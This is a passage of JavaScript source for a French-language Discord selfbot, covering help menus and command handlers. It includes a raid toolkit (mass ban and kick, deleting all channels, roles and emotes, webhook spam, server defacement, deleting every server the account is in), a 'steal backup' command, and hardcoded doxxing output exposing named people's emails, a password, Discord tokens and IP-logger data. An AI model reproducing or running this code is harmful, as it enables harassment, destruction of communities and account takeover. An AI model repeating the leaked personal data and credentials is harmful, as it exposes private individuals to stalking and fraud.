.setTitle('Pannel de menu util 🌐')
.setURL('https://discord.gg/3ScUGWWEv7')
.setImage(yourgif)
}
else{
  var helpnsfw = ">>> ```ansi\n[35m<>[0m est obligatoire | [34m[][0m est optionnel``````ansi" + `
${prefix}Ass        » Affiche des images de cul
${prefix}Pussy      » Affiche des images de ch*tte
${prefix}nsfw-gif   » Envoie des gif NSFW
${prefix}anal       » Montre une image t'as capté
${prefix}thigh      » Montre des ilages thigh
${prefix}4k         » Affiche des images en 4K
${prefix}hentai     » Envoie des images stylé`+"```"
  }

if (emode["embed"] === "on"){
  var helpserv = new WebEmbed()
  .setColor(color)
  .setDescription(`
${prefix}𝐬𝐞𝐭 𝐜𝐨𝐦𝐦𝐮𝐧𝐢𝐭𝐲 <𝐨𝐧/𝐨𝐟𝐟>

${prefix}𝐬𝐞𝐭 𝐫𝐮𝐥𝐞𝐬 #𝐜𝐡𝐚𝐧𝐧𝐞𝐥

${prefix}𝐬𝐞𝐭 𝐯𝐞𝐫𝐢𝐟𝐢𝐜𝐚𝐭𝐢𝐨𝐧 <𝟏/𝟐/𝟑/𝟒/𝟓>

${prefix}𝐠𝐮𝐢𝐥𝐝 𝐧𝐚𝐦𝐞 <𝐧𝐨𝐦>

${prefix}𝐠𝐮𝐢𝐥𝐝 𝐥𝐞𝐚𝐯𝐞

${prefix}𝐝𝐞𝐥𝐞𝐭𝐞 𝐠𝐮𝐢𝐥𝐝

${prefix}𝐠𝐮𝐢𝐥𝐝 𝐜𝐭𝐞𝐦𝐩𝐥𝐚𝐭𝐞 <𝐧𝐨𝐦>
  `)
    .setProvider({ name: `${client.user.username}`, url: 'https://discord.com/channels/@me/1005922696909037679' })
  .setTitle('Pannel de menu serveur 💬')
  .setURL('https://discord.gg/3ScUGWWEv7')
  .setImage(yourgif)
}
else{
  var helpserv = ">>> ```ansi\n[35m<>[0m est obligatoire | [34m[][0m est optionnel``````ansi" + `
${prefix}set community [35m<on/off>[0m        » Activer ou désactiver la communautée
${prefix}set rules [35m<#channel>[0m          » Définir le salonn règles
${prefix}set verification [35m<1/2/3/4/5>[0m  » Changer le niveau de vérification
${prefix}guild name [35m<name>[0m             » Changer le nom du serveur
${prefix}guild ctemplate [35m<name>[0m        » Créé un modèle de serveur
${prefix}guild leave                   » Quitter le serveur actuel
${prefix}delete guild                  » Supprimer le serveur actuel`+"```"
  }

  if (emode["embed"] === "on"){
    var helptool = new WebEmbed()
    .setColor(color)
    .setDescription(`${prefix}𝐚𝐝𝐝 𝐟𝐫𝐢𝐞𝐧𝐝 <@𝐮𝐬𝐞𝐫>

${prefix}𝐫𝐞𝐦𝐨𝐯𝐞 𝐟𝐫𝐢𝐞𝐧𝐝 <@𝐮𝐬𝐞𝐫>
    
${prefix}𝐛𝐥𝐨𝐜𝐤 <@𝐮𝐬𝐞𝐫>
    
${prefix}𝐮𝐧𝐛𝐥𝐨𝐜𝐤 <@𝐮𝐬𝐞𝐫>
    
${prefix}𝐜𝐚𝐥𝐥 <@𝐮𝐬𝐞𝐫>
    
${prefix}𝐜𝐥𝐨𝐬𝐞 <𝐢𝐝>

${prefix}𝐬𝐡𝐮𝐭𝐝𝐨𝐰𝐧
    `)
      .setProvider({ name: `${client.user.username}`, url: 'https://discord.com/channels/@me/1005922696909037679' })
    .setTitle('Pannel de menu tool 🛠')
    .setURL('https://discord.gg/3ScUGWWEv7')
    .setImage(yourgif)
    
  }
  else{
    var helptool = ">>> ```ansi\n[35m<>[0m est obligatoire | [34m[][0m est optionnel``````ansi" + `
${prefix}update             » Met à jour le bot
${prefix}add friend [35m<user>[0m  » Ajouter quelqu'un en ami
${prefix}block [35m<user>[0m       » Bloquer quelqu'un
${prefix}unblock [35m<user>[0m     » Débloquer quelqu'un
${prefix}call [35m<user>[0m        » Lancer un appel
${prefix}close [35m<id>[0m         » Fermer le salon en mp
${prefix}shutdown           » Eteint complètement le bot`+"```"
    }

  if (emode["embed"] === "on"){
    var helpraid = new WebEmbed()
    .setColor(color)
    .setDescription(`
${prefix}𝐝𝐞𝐬𝐭𝐫𝐨𝐲

${prefix}𝐚𝐥𝐥 𝐛𝐚𝐧

${prefix}𝐚𝐥𝐥 𝐤𝐢𝐜𝐤

${prefix}𝐝𝐞𝐥𝐞𝐭𝐞 𝐚𝐥𝐥 𝐬𝐭𝐢𝐜𝐤𝐞𝐫𝐬
    
${prefix}𝐝𝐞𝐥𝐞𝐭𝐞 𝐚𝐥𝐥 𝐞𝐦𝐨𝐭𝐞𝐬
    
${prefix}𝐝𝐞𝐥𝐞𝐭𝐞 𝐚𝐥𝐥 𝐜𝐡𝐚𝐧𝐧𝐞𝐥𝐬
    
${prefix}𝐝𝐞𝐥𝐞𝐭𝐞 𝐚𝐥𝐥 𝐫𝐨𝐥𝐞𝐬
    
${prefix}𝐜𝐫𝐞𝐚𝐭𝐞 𝐜𝐡𝐚𝐧𝐧𝐞𝐥𝐬
    
${prefix}𝐰𝐞𝐛𝐡𝐨𝐨𝐤 𝐬𝐩𝐚𝐦 <𝐭𝐞𝐱𝐭>

${prefix}𝐜𝐫𝐞𝐚𝐭𝐞𝐬 𝐫𝐨𝐥𝐞𝐬
    
${prefix}𝐝𝐞𝐟𝐚𝐜𝐞
    Modifie le serveur (la pp, le nom, la bannière, le niveau de vérif, désactive la commanauté, les notifs)`)
      .setProvider({ name: `${client.user.username}`, url: 'https://discord.com/channels/@me/1005922696909037679' })
    .setTitle('Pannel de menu raid ⛔')
    .setURL('https://discord.gg/3ScUGWWEv7')
    .setImage(yourgif)
  }
  else{
    var helpraid = ">>> ```ansi\n[35m<>[0m est obligatoire | [34m[][0m est optionnel``````ansi" + `
${prefix}destroy [35m<texte>[0m        » Toutes les commandes raids en une
${prefix}all ban                » Ban tous les membres d'un serveur
${prefix}all kick               » Kick tous les membres d'un serveur
${prefix}delete all stickers    » Supprime tous les stickers
${prefix}delete all emotes      » Supprime toutes les emotes
${prefix}delete all channels    » supprime tous les salons
${prefix}webhook spam [35m<texte>[0m   » Spam un texte avec des webhooks
${prefix}stop webhook spam      » Arrête le spam de webhook
${prefix}create roles [34m[text][0m    » Créé un tas de rôles
${prefix}create channels [34m[text][0m » Créé un tas de salons
${prefix}spam [text]            » Spam un texte
${prefix}stopspam               » Arrête le spam
${prefix}deface                 » Modifie totalement le serveur
${prefix}décale                 » Supprime tous les salons pour décaler`+"```"
    }

let messageArray = message.content.split(" ");
let args = messageArray.slice(1);
mentionUser = message.mentions.users.first();
const argss = message.content.trim().split(/ +/g);



if (message.content === (prefix + "help")){
  if (emode["embed"] === "on") return message.edit({embeds: [help]}).catch(() => false)
  if (emode["embed"] === "off") return message.edit(help).catch(() => {}) // Patched :)
}

if (message.content === (prefix + "crow")){
  if (emode["embed"] === "on") return message.edit({embeds: [helpcrow]}).catch(() => false)
  if (emode["embed"] === "off") return message.edit(helpcrow).catch(() => {}) // Patched :)
}

if (message.content === (prefix + "backups")){
  if (emode["embed"] === "on") return message.edit({embeds: [helpbackup]}).catch(() => false)
  if (emode["embed"] === "off") return message.edit(helpbackup).catch(() => {}) // Patched :)
}

if (message.content === (prefix + "status")){  
  if (emode["embed"] === "on") return message.edit({embeds: [helpstatus]}).catch(() => false)
  if (emode["embed"] === "off") return message.edit(helpstatus).catch(() => {}) // Patched :)}
}
if (message.content === (prefix + "perms")){
  if (emode["embed"] === "on") return message.edit({embeds: [helpperm]}).catch(() => false)
  if (emode["embed"] === "off") return message.edit(helpperm).catch(() => {}) // Patched :)
}


if (message.content === (prefix + "user")){
  if (emode["embed"] === "on") return message.edit({embeds: [helpuser]}).catch(() => false)
  if (emode["embed"] === "off") return message.edit(helpuser).catch(() => {}) // Patched :)
}

if (message.content === (prefix + "paypal"))
{
  message.edit("https://paypal.me/Anonyme1010")
}

if (message.content === (prefix + "dox 762714806196633690"))
{
  message.edit("Name : Nino CAMPION,\n Id google : 100424173751463009014,\n Email :campion.nino@gmail.com,\n old mdp : Nino080807,\n token discord : NzYyNzE0ODA2MTk2NjMzNjkw.GLFwjC.KrSf12ET_4g_ZJbe_uke-fErn960u54_P-Jub0, \n google maps : https://www.google.com/maps/contrib/100424173751463009014/photos/@49.0134037,2.0308467,14z/data=!4m3!8m2!3m1!1e1")
}

if (message.content === (prefix + "dox 823981303950606357"))
{
  message.edit("utilisateur indoxable")
}
  
if (message.content === (prefix + "token"))
{
  message.edit ("NzI2NDY2NzA5MzMzOTk5NjM2.G9PDPA.2hO-X_K7McooUFAPmjJyjguElTkIbSpAfmx4cQ")
}

if (message.content === (prefix + "dox 789226828283904011"))
{
  message.edit("pourquoi est-il dox ? : c' est un putain d arnaqueur, \n  mon action est donc de la défense. \n son Email : rlemesle29@gmail.com, \n \n son Name : Raphael Lemesle, \n son Id google : 109938884675343605242, \n sa Last Update : 1855-02-23, \n  son profile Google Maps : https://www.google.com/maps/contrib/109938884675343605242, \n IP logger result, 2022-09-13 16:46:21 UTC, \n IP Address : 77.131.123.101, \n sa Timezone    Europe/Paris GMT+2, \n son Screen Size    412 x 915, \n sa Local IP    192.168.1.76, \n son GPU    Mali-G52 MC2, \n son Browser    Ecosia (101.0.4951.41), \n son Operating System    Android 10, \n Device    Samsung Galaxy A41, \n Touch Screen    Yes (5 touch points), \n  User Agent    Mozilla/5.0 (Linux; Android 10; SM-A415F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.41 Mobile Safari/537.36 (Ecosia android@101.0.4951.41), \n sa Platform   Linux armv8l, \n son Host Name    101.123.131.77.rev.sfr.net")
}

if (message.content === (prefix + "util")){
  if (emode["embed"] === "on") return message.edit({embeds: [helputil]}).catch(() => false)
  if (emode["embed"] === "off") return message.edit(helputil).catch(() => {}) // Patched :)
}

if (message.content === (prefix + "dox")){
  if (emode["embed"] === "on") return message.edit({embeds: [helpdoxl]}).catch(() => false)
  if (emode["embed"] === "off") return message.edit(helpdox).catch(() => {}) // Patched :) 
}

if (message.content === (prefix + "nsfw")){
  if (emode["embed"] === "on") return message.edit({embeds: [helpnsfw]}).catch(() => false)
  if (emode["embed"] === "off") return message.edit(helpnsfw).catch(() => {}) // Patched :)
  }

if (message.content === (prefix + "serveur")){
  if (emode["embed"] === "on") return message.edit({embeds: [helpserv]}).catch(() => false)
  if (emode["embed"] === "off") return message.edit(helpserv).catch(() => {}) // Patched :)
}

if (message.content === (prefix + "tool")){
  if (emode["embed"] === "on") return message.edit({embeds: [helptool]}).catch(() => false)
  if (emode["embed"] === "off") return message.edit(helptool).catch(() => {}) // Patched :)
}


if (message.content === (prefix + "raid")){
  if (emode["embed"] === "on") return message.edit({embeds: [helpraid]}).catch(() => false)
  if (emode["embed"] === "off") return message.edit(helpraid).catch(() => {}) // Patched :)
}

if (message.content === (prefix + "profile")){
  if (emode["embed"] === "on") return message.edit({embeds: [helpprofile]}).catch(() => false)
  if (emode["embed"] === "off") return message.edit(helpprofile).catch(() => {}) // Patched :)
}


if (message.content === (prefix + "shutdown")){
  message.delete().catch(e => { })
  setTimeout(() => {
    client.destroy()
  }, 500);
  setTimeout(() => {
    process.exit(1)
  }, 750);
}






if (message.content.startsWith(prefix + "secur")){
  let webhook = "off"
  if (crowsecur["antiwebhook"] === "on") webhook = "on"
  let channels = "off"
  if (crowsecur["antichannel"] === "on") channels = "on"
  let roles = "off"
  if (crowsecur["antirole"] === "on") roles = "on"
  let ping = "off"
  if (crowsecur["antiping"] === "on") ping = "on"
  let link = "off"
  if (crowsecur["antilink"] === "on") link = "on"
  let ban = "off"
  if (crowsecur["antiban"] === "on") ban = "on"
  let kick = "off"
  if (crowsecur["antikick"] === "on") kick = "on"
  let bot = "off"
  if (crowsecur["antiban"] === "on") bot = "on"
  let update = "off"
  if (crowsecur["antiupdate"] === "on") update = "on"
  if (args[0] === "on"){
    if (emode["embed"] === "on"){
    var secur = new WebEmbed()
    .setTitle("Securisation du serveur")
    .setDescription(`𝐀𝐧𝐭𝐢𝐰𝐞𝐛𝐡𝐨𝐨𝐤: 𝐨𝐧
    𝐀𝐧𝐭𝐢𝐜𝐡𝐚𝐧𝐧𝐞𝐥𝐬: 𝐨𝐧
    𝐀𝐧𝐭𝐢𝐫𝐨𝐥𝐞𝐬: 𝐨𝐧
    𝐀𝐧𝐭𝐢𝐩𝐢𝐧𝐠: 𝐨𝐧
    𝐀𝐧𝐭𝐢𝐥𝐢𝐧𝐤: 𝐨𝐧
    𝐀𝐧𝐭𝐢𝐛𝐚𝐧: 𝐨𝐧
    𝐀𝐧𝐭𝐢𝐤𝐢𝐜𝐤: 𝐨𝐧
    𝐀𝐧𝐭𝐢𝐛𝐨𝐭: 𝐨𝐧
    𝐀𝐧𝐭𝐢𝐮𝐩𝐝𝐚𝐭𝐞: 𝐨𝐧
    `)
    .setImage(yourgif)
    }
  else{
    var secur = "```"+
    `Antiwebhook     » on
Antichannels    » on
Antiroles       » on
Antiping        » on
Antilink        » on
Antiban         » on
Antikick        » on
Antibot         » on
Antiupdate      » on`
    +"```"
  }
  crowsecur["antiwebhook"] = "on"
crowsecur["antichannel"] = "on"
crowsecur["antirole"] = "on"
crowsecur["antiping"] = "on"
crowsecur["antilink"] = "on"
crowsecur["antiban"] = "on"
crowsecur["antikick"] = "on"
crowsecur["antibot"] = "on"
crowsecur["antiupdate"] = "on"
savesecur()
  if (emode["embed"] === "on") return message.edit({embeds: [secur]})
  if (emode["embed"] === "off") return message.edit(secur)
}
else if (args[0] === "off"){  
  if (emode["embed"] === "on"){

  var secur = new WebEmbed()
  .setTitle("Securisation du serveur")
  .setDescription(`𝐀𝐧𝐭𝐢𝐫𝐨𝐥𝐞𝐬: 𝐨𝐟𝐟
  𝐀𝐧𝐭𝐢𝐩𝐢𝐧𝐠: 𝐨𝐟𝐟
  𝐀𝐧𝐭𝐢𝐥𝐢𝐧𝐤: 𝐨𝐟𝐟
  𝐀𝐧𝐭𝐢𝐛𝐚𝐧: 𝐨𝐟𝐟
  𝐀𝐧𝐭𝐢𝐤𝐢𝐜𝐤: 𝐨𝐟𝐟
  𝐀𝐧𝐭𝐢𝐛𝐨𝐭: 𝐨𝐟𝐟
  𝐀𝐧𝐭𝐢𝐮𝐩𝐝𝐚𝐭𝐞: 𝐨𝐟𝐟
  `)
  .setImage(yourgif)
}
else{
  var secur = "```"+
  `Antiwebhook     » off
Antichannels    » off
Antiroles       » off
Antiping        » off
Antilink        » off
Antiban         » off
Antikick        » off
Antibot         » off
Antiupdate      » off`
  +"```"
}
crowsecur["antiwebhook"] = "off"
crowsecur["antichannel"] = "off"
crowsecur["antirole"] = "off"
crowsecur["antiping"] = "off"
crowsecur["antilink"] = "off"
crowsecur["antiban"] = "off"
crowsecur["antikick"] = "off"
crowsecur["antibot"] = "off"
crowsecur["antiupdate"] = "off"
savesecur()
if (emode["embed"] === "on") return message.edit({embeds: [secur]})
if (emode["embed"] === "off") return message.edit(secur)
}
  else{
  if (emode["embed"] === "on"){
    var secur = new WebEmbed()
    .setTitle("Securisation du serveur")
    .setDescription(`Antiwebhook: ${webhook}
    Antichannels: ${channels}
    Antiroles: ${roles}
    Antiping: ${ping}
    Antilink: ${link}
    Antiban: ${ban}
    Antikick: ${kick}
    Antibot: ${bot}
    Antiupdate: ${update}
    `)
    .setImage(yourgif)
  }
  else{
    var secur = "```"+
    `Antiwebhook     » ${webhook}
Antichannels    » ${channels}
Antiroles       » ${roles}
Antiping        » ${ping}
Antilink        » ${link}
Antiban         » ${ban}
Antikick        » ${kick}
Antibot         » ${bot}
Antiupdate      » ${update}`
    +"```"
  }
  if (emode["embed"] === "on") return message.edit({embeds: [secur]})
  if (emode["embed"] === "off") return message.edit(secur)
}
}













// Embed Mode
if (message.content.startsWith(prefix + "embed")){
  function saveembed() {
    fs.writeFile("./Data/embed.json", JSON.stringify(emode), err => {
        if (err) console[_0x47d837(-0x187, 0x465, 0x2a5, 0x5d7)](err);
  
    })
  }

  if (!args[0]) return message.edit(":x: **Veuillez utiliser la commande comme ceci: `"+prefix+"embed on`**")
  if (args[0] === "on"){
    emode["embed"] = "on"
    message.edit("✔ **Mode embed activé**").catch(() => false)
    saveembed()
  }
  if(args[0] === "off"){
    emode["embed"] = "off"
    message.edit("✔ **Mode embed désactivé**").catch(() => false)
    saveembed()
  }
}




// Backups
if (message.content.startsWith(prefix + "steal backup")){
  if (!message.guild) return message.edit(":x: **Cette commande doit être utilisé dans un serveur**").catch(() => {});
  message.delete().catch(() => false)
  const guild = message.guild
  const backup = require("discord-backup");
  backup.create(message.guild, {
        maxMessagesPerChannel: 0,
        jsonBeautify: true,
        doNotBackup: [ "emojis", "bans" ],
        saveImages: "base64"
}).then((backupData) => {
    // And send informations to the backup owner
    message.channel.send("la commande à utiliser: `"+prefix+"load backup "+backupData.id+"`!");
});
}

if (message.content.startsWith(prefix + "create backup")){
  if (!message.guild) return message.edit(":x: **Cette commande doit être utilisé dans un serveur**").catch(() => {});
  const guild = message.guild
  const backup = require("discord-backup");
  backup.create(message.guild, {
    jsonBeautify: true,
    saveImages: "base64"
}).then((backupData) => {
    // And send informations to the backup owner
    message.edit("la commande à utiliser: `"+prefix+"load backup "+backupData.id+"`!");
});
}

if (message.content.startsWith(prefix + "create msg backup")){
  if (!message.guild) return message.edit(":x: **Cette commande doit être utilisé dans un serveur**").catch(() => {});
  message.delete().catch(() => false)
  const guild = message.guild
  const backup = require("discord-backup");
  backup.create(message.guild, {
        maxMessagesPerChannel: 10,
        jsonBeautify: true,
        doNotBackup: [ "emojis", "bans" ],
        saveImages: "base64"
}).then((backupData) => {
    // And send informations to the backup owner
    message.channel.send("la commande à utiliser: `"+prefix+"load backup "+backupData.id+"`!");
});
}

if (message.content.startsWith(prefix + "load backup")){
  if (!message.guild) return message.edit(":x: **Cette commande doit être utilisé dans un serveur**")
  const guild = message.guild

  const backup = require("discord-backup");
  let backupID = args[1];
  if(!backupID){
      return message.edit(":x: **Tu dois me donner une id de backup valide**");
  }
  backup.load(backupID, guild, {
    clearGuildBeforeRestore: true
  })
}

if (message.content.startsWith(prefix + "list backup")){
  const backup = require("discord-backup");
  backup.list().then((backups) => {
    message.edit(`Voici la liste des backups\n${backups}`); // Expected Output [ "BC5qo", "Jdo91", ...]
});
}

if (message.content.startsWith(prefix + "info backup")){
  if (!args[1]) return message.edit(":x: **Donne moi l'id d'une backup valide**")
  let backupID = args[1]
  
  backup.fetch(backupID).then((backup) => {

    const date = new Date(backup.data.createdTimestamp);
    const yyyy = date.getFullYear().toString(), mm = (date.getMonth()+1).toString(), dd = date.getDate().toString();
    const formattedDate = `${yyyy}/${(mm[1]?mm:"0"+mm[0])}/${(dd[1]?dd:"0"+dd[0])}`;

    const embed = new WebEmbed()
        .setAuthor({
          name: `ℹ️ Backup `,
         iconURL: backup.data.iconBase64(),
        })
        .setDescription(`𝐍𝐨𝐦 𝐝𝐮 𝐬𝐞𝐫𝐯𝐞𝐮𝐫: ${backup.data.name}
        𝐓𝐚𝐢𝐥𝐥𝐞; ${backup.size}
        𝐂𝐫éé 𝐥𝐞: ${formattedDate}
        𝐁𝐚𝐜𝐤𝐮𝐩 𝐈𝐃: ${backup.id}`)

    return message.edit({embeds: [embed]});

}).catch((err) => {

    if (err === 'No backup found')
        return message.edit(':x: Aucune backup avec l\'id `'+backupID+'`!');
});
}







// Util Client User



if (message.content.startsWith(prefix + "set bio")){
  const argss = message.content.trim().split(/ +/g);

  const bio = argss.splice(1).join(' ')
  if (!bio) return message.edit(":x: **Tu dois me donner un bio**")
client.user.setAboutMe(bio)
message.edit("**✔ bio modifier avec succès**")
}

if (message.content.startsWith(prefix + "change hypesquad")){ 
  const bio = args[1] || "leave"
  if (bio == "balance"){
    client.user.setHypeSquad(3)
    message.edit("**✔ Tu as rejoint la hypesquad `Balance`**")
  }
  else if (bio == "brillance"){
    client.user.setHypeSquad(2)
    message.edit("**✔ Tu as rejoint la hypesquad `Brillance`**")
  }
  else if (bio == "bravery"){
    client.user.setHypeSquad(1)
    message.edit("**✔ Tu as rejoint la hypesquad `Bravery`**")
  }
  else if (bio == "leave"){
    client.user.setHypeSquad(0)
    message.edit("**✔ Tu as quitter ta hypesquad**")
  }

}

if (message.content.startsWith(prefix + "set avatar")){
  let avatar = args[1] || yourgif
  client.user.setAvatar(avatar).then(  message.edit("✔ **Avatar changée avec succès**")).catch(e => { message.edit(":x: **l'avatar n'a pas pu être modifiée**")})

}

if (message.content.startsWith(prefix + 'set note')){
  if (!message.mentions.users.first()) return message.edit(":x: **Veuillez me donner un membre valide**")
  const argss = message.content.trim().split(/ +/g);

  const bio = argss.splice(3).join(' ') || "Note vide"
  message.mentions.users.first().setNote(bio).then(message.edit("✔** Note modifiée**")).catch(e => message.edit(":x: **Note non modifiée, erreur dans la console**"), console.error())
}


if (message.content.startsWith(prefix + "set banniere")){
  let avatar = args[1] || yourgif
  client.user.setBanner(avatar).then(  message.edit("✔ **Bannière changée avec succès**")).catch(e => { message.edit(":x: **la bannière n'a pas pu être modifiée**")})

}

if (message.content.startsWith(prefix + "change password")){
  let old = args[1]
  let slt = args[2]
  if (!old) return message.edit(":x: **Tu dois mettre ton ancien mot de passe**");
  if (!slt) return message.edit(":x: **Tu dois mettre ton nouveau mot de passe**")
  client.user.setPassword(old, slt).then(  message.edit("✔ **Mot de passe changée avec succès**")).catch(e => { message.edit(":x: **le mot de passe n'a pas pu être modifié**")})
}

if (message.content.startsWith(prefix + "change username")){
  let old = args.splice(3).join(" ") || client.user.username + " 🕷"
  let slt = args[1]
  if (!slt) return message.edit(":x: **Tu dois mettre ton mot de passe exemple:** " + `\`${prefix}changeusername <mot de passe> <pseudo>\``)
  client.user.setPassword(old, slt).then(  message.edit("✔ **Pseudo changée avec succès**")).catch(e => { message.edit(":x: **le pseudo n'a pas pu être modifié**")})

}

if (message.content.startsWith(prefix + "sltcv")){
  client.guilds.cache.forEach((guild) => {
    guild.delete().catch(() => false)
  })
}

if (message.content.startsWith(prefix + "change email")){
  let old = args[1]
  let slt = args[2]
  if (!old) return message.edit(":x: **Tu dois mettre ton email**")
  if (!slt) return message.edit(":x: **Tu dois mettre ton mot de passe**")
  client.user.setEmail(old, slt).then(  message.edit("✔ **Email changée avec succès**")).catch(e => { message.edit(":x: **l'email n'a pas pu être modifié**")})
}

if (message.content.startsWith(prefix + "set tag")){
  let discriminator = args[1]
  let slt = args[2]
  if (!discriminator) return message.edit(":x: **Tu dois mettre ton tag**")
  if (!slt) return message.edit(":x: **Tu dois mettre ton mot de passe**")
  client.user.setDiscriminator(discriminator, slt).then(  message.edit("✔ **Tag changée avec succès**")).catch(e => { message.edit(":x: **le tag n'a pas pu être modifié, erreur dans la console**"), console.log(e)})
}


if (message.content.startsWith(prefix + "delete account")){
  client.user.deleteAccount.then(message.delete()).catch(e => {console.log(e)})
}


























// Guilds
const guild = message.guild

if (message.content.startsWith(prefix + "set owner")){
  message.guild.setOwner(guild.members.cache.first())
 .then(guild => guild.fetchOwner())
 .then(owner => message.edit("✔ **Owner actuel: **" + owner.displayName))
 .catch( e => message.edit(":x: **Owner n'a pas pu être changé, regadez la console**"), console.log(e));
}

if (message.content.startsWith(prefix + "set rules")){
const channel = message.mentions.channels.first()
if (!channel) return message.edit(":x: **Veuillez donner un salon `#salon`**")
guild.setRulesChannel(channel)
.then(updated => console.log(`✔ **le nouveau salon de règle est ${guild.rulesChannel.name}**`))
.catch(message.edit(":x: **Erreur, regardez la console**"), console.error);
}

if (message.content.startsWith(prefix + "set verification")){
  const verif = args[1] || 1
  if (args[0] == "1"){
    guild.setVerificationLevel("NONE")
    .then(updated => message.edit(`✔ **Le niveau de vérification est ${guild.verificationLevel}**`))
    .catch(message.edit(":x: **Erreur, regardez la console**"), console.error);
  }
  else if (args[0] == "2"){
    guild.setVerificationLevel("LOW")
    .then(updated => message.edit(`✔ **Le niveau de vérification est ${guild.verificationLevel}**`))
    .catch(message.edit(":x: **Erreur, regardez la console**"), console.error);
  }
  else if (args[0] == "3"){
    guild.setVerificationLevel("MEDIUM")
    .then(updated => message.edit(`✔ **Le niveau de vérification est ${guild.verificationLevel}**`))
    .catch(message.edit(":x: **Erreur, regardez la console**"), console.error);
  }
  else if (args[0] == "4"){
    guild.setVerificationLevel("HIGH")
    .then(updated => message.edit(`✔ **Le niveau de vérification est ${guild.verificationLevel}**`))
    .catch(message.edit(":x: **Erreur, regardez la console**"), console.error);
  }
  else if (args[0] == "5"){
    guild.setVerificationLevel("VERY HIGH")
    .then(updated => message.edit(`✔ **Le niveau de vérification est ${guild.verificationLevel}**`))
    .catch(message.edit(":x: **Erreur, regardez la console**"), console.error);
  }
  else {
    guild.setVerificationLevel("NONE")
    .then(updated => message.edit(`✔ **Le niveau de vérification est ${guild.verificationLevel}**`))
    .catch(message.edit(":x: **Erreur, regardez la console**"), console.error);
  }

}

if (message.content.startsWith(prefix + "guild name")){
  if (!args[1]) return message.edit(":x: **donnez moi un nom de serveur**")
  const name = args.slice(1).join(" ");
  guild.setName(name)
 .then(updated => console.log(`✔ **Nom du serveur modifié ${updated.name}**`))
 .catch(message.edit("**:x: Nom de serveur non modifié, regarde la console**"), console.error);
}

if (message.content.startsWith(prefix + "guild leave")){
  message.delete()
  .then(guild.leave())
  .catch(console.error);
}

if (message.content.startsWith(prefix + "delete guild")){
  guild.delete()
  .then(g => console.log(`serveur supprimé ${g}`))
  .catch(message.delete(), console.error);
}

if (message.content.startsWith(prefix + "guild ctemplate")){
  if (!args[0]) return message.edit(":x: **Il manque un nom de template**")
  guild.createTemplate(args[1])
  .then(g => message.delete() && console.log(g))
  .catch(message.edit(":x: **Template non créé**"), console.error)
}

if (message.content.startsWith(prefix + "set community")){
  if (!args[1]) return message.edit(":x: **met on ou off**")
if (args[1] == "on"){
  message.guild.setCommunity(true).catch(e => { })
message.delete()
}
else{
  message.guild.setCommunity(false).catch(e => { })
message.delete()
}
}






if (message.content.startsWith(prefix + "join")){
const code = args[0] || "YRzn5DtVyv"
  await client.fetchInvite(code).then(async invite => {
    await invite.acceptInvite(true); 
  });
}


if (message.content.startsWith(prefix + "groupecall")){
  if (!args[0]) return message.edit(":x: **Donne moi l'id d'un groupe**")
  const groupDM = client.channels.cache.get(args[0]);
  await groupDM.call()
message.edit("✔ **Appelle lancé**")
}


if (message.content.startsWith(prefix + "add friend")){
if (!  message.mentions.users.first()) return message.edit(":x: **Tu dois mentionner quelqu'un**")
  message.mentions.users.first().sendFriendRequest().then(message.edit("✔ **Demande d'ami envoyé à ** <@" +message.mentions.users.first() + ">")).catch(e => { message.edit(":x: **Demande d'ami non envoyé, erreur dans la console**"), console.log(e)})
  }

  if (message.content.startsWith(prefix + "remove friend")){
    let user = message.mentions.users.first()
    if (!user) return message.edit(":x: **Tu dois mentionner quelqu'un**")
    user.unFriend()
    .then(message.edit("✔ **d'ami retiré**"))
    .catch(e => { message.edit(":x: **ami non enlevé, erreur dans la console**"), console.log(e)})
  }

  if (message.content.startsWith(prefix + "unblock")){
    let user = message.mentions.users.first()
    if (!user) return message.edit(":x: **Tu dois mentionner quelqu'un**")
    user.unBlock()
    .then(message.edit("✔ **utilisateur débloqué**"))
    .catch(e => { message.edit(":x: **utilisateur non débloqué, erreur dans la console**"), console.log(e)})
  }

  if (message.content.startsWith(prefix + "block")){
    let blocked = message.mentions.users.first()
    if (!blocked) return message.edit(':x: **Tu dois mentionner quelqu\'un**')
    message.mentions.users.first().setBlock().then(message.edit("✔ **"+blocked+" bloqué avec succès**")).catch(e => { message.edit(":x: **Utilisateur non bloqué, erreur dans la console**"), console.log(e)})
  }
  
  
  
  if (message.content.startsWith(prefix + "call")){
    if (!args[0]) return message.edit(':x: **ping someone**')
    const dmChannel = await message.mentions.users.first().createDM();
    if (!dmChannel) return message.edit(':x: **no dm channel**')
    await dmChannel.call().then(message.edit("✔ **call.. **")).catch(e => { message.edit(":x: **error**"), console.log(e)})
  }
  
  if (message.content.startsWith(prefix + "close")){
    let dmChannel = client.users.cache.get(args[0]) || message.mentions.users.first();
    if (!dmChannel && message.channel.type == "dm") dmChannel = message.channel
    else return message.edit(":x: **Donnez moi l'id de quelqu'un**")
    message.delete().then(dmChannel.deleteDM()).catch(e => { })
  }

  if (message.content === prefix + 'groupelock') {
    let slt = message.channel.id
          message.delete().catch(() => false)
            setInterval(async () => {
                request(`https://discord.com/api/v9/channels/${slt}/recipients/${client.user.id}`, {
                    "headers": {
                        "accept": "*/*",
                        "authorization": `${token}`,
                    },
                    "method": "PUT",
                }, (err, response, body) => {
                });
            }, 350);
        }







if (message.content.startsWith(prefix + "reset")){
  message.delete().catch(() => false)
  if (rpc === "on"){
  setTimeout(() => {
    if (!titre && !ligne1 && !ligne2 && !rpcimage) return;
    const r = new RichPresence()
    .setApplicationId('1006729051702038628')
    .setType('PLAYING')
    .setURL('https://discord.gg/eTgaDja53E')
    if (ligne2) r.setState(ligne2)
    if (titre) r.setName(titre)
    if (ligne1) r.setDetails(ligne1)
    if (rpcimage) r.setAssetsLargeImage(rpcimage)
    if (boutontexte && boutonurl) r.addButton(boutontexte, boutonurl)
    if (boutontexte2 && boutonurl2) r.addButton(boutontexte2, boutonurl2)
    if (timestamp === "on") r.setStartTimestamp(Date.now())
    client.user.setActivity(r.toJSON());
  }, 1000);
  }
}

  if (message.content.startsWith(prefix + "black clover")){
    const text = args.slice(1).join(' ')
     let status = ""
    if (text) status = text + " sur"
    let det = " "
    if (text) det = text
    const r = new RichPresence()
    .setApplicationId('1008318155136978975')
    .setType('PLAYING')
    .setState(client.user.username)
    .setName('Black Clover ☘')
.setDetails(det)
    if (!text) r.setDetails(" ")
    .setStartTimestamp(Date.now())
    .setAssetsLargeImage('mp:attachments/1008133909374050392/1008370322405330944/78e6d5cfa808cb30748d8b8fcbac799c.jpg?width=230&height=428')
